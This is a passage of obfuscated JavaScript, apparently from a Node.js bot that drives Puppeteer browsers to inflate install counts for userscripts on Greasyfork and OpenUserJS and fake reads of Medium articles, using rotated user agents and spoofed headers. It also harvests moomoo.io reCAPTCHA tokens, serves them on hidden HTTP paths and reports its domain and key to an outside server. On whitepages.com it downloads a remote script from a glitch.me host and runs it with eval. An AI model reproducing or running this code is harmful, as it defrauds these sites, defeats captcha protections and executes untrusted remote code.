      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + a0(0x1c, 'Qoj%') + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a1(0x3) + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + a0(0xb, 'Xjsi') + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0x22) + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + a0(0x7, '1V@q'),
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + a0(0xc, '1V@q') + a1(0x18) + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + a1(0x11),
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    Z(0x1e) + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x224 + 0xd * -0x29c + 0x3f9 * 0x8
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x97 * -0x11 + 0x25 * 0x8d + -0x5 * 0x212)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0xfd7 * -0x2 + -0x2322 + 0x3d8), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1 * -0xf0e + -0x1277 + -0x3cd * -0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x121 * 0x19 + -0x1397 + -0x1fe * -0x18;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1ca * 0x8 + -0x5d1 * -0x3 + 0xad * -0x2f; w < getRandomInt(-0xef * -0x13 + -0x20fb + 0xf3f, -0x262e + 0x5 * 0x5ad + 0x9d2); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1c0c1 + -0x67 * -0x43f + -0x11e * -0xdc);
        }
      }();
    }, 0x2 * -0x2b0 + -0x1a0d * 0x1 + 0xa9b * 0x3), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x6 * -0x246 + 0x2258 + 0x19 * -0xd4;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x315 + -0x174 * 0x19 + 0x1 * 0x213f, 0x61f * -0x2 + 0x1 * -0x18c2 + 0x2532)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x23b * -0x2e + -0x13fc + -0x77e3 * -0x2);
    }, 0x104 + -0x47 * -0x8b + 0x1 * -0x272d), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x15b5 * 0x1 + 0x2 * -0xb05 + 0x2bbf;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x6 * -0x1b3 + -0x239a + 0x3984), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x158f + 0x1c09 + 0x1 * -0x3198), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x1 * -0x12475b + 0xd11f0 + 0x12f10b);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x268f + -0x1d1d + -0x441 * -0x10);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x15 * -0x80 + -0x1 * -0x1ea2 + 0x2 * -0x9ad);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x3da + -0xb28 + 0x2e92);
}
doFlags['doOUJS'] && ((async () => {
  const a5 = c,
    a4 = b,
    a3 = d;
  async function f() {
    const a2 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x39 * -0x65 + -0x301 * -0xa + -0x3486) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x137b * -0x1 + 0x294 + -0x1 * 0x160e));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x2437 + -0x3f5 + 0x282c, D['indexOf']('\x20'));
        return B ? E['slice'](0x622 * -0x3 + -0x1 * 0x1cab + 0x2f11, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x2 * 0x1cbe + 0x2d4a + 0x3342),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers'][a2(0x1a)]('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x8 * -0x1c9 + -0x39ce + 0x2 * 0x3793),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + a3(0x6) + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + a4(0x14, 'hpkz') + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + a5(0xd) + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + a3(0x13) + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x629 * -0x2 + 0x13 * -0x1f3 + 0xab * 0x25; k < 0x2039 + 0x1 * 0x14ce + -0x3503; k++)
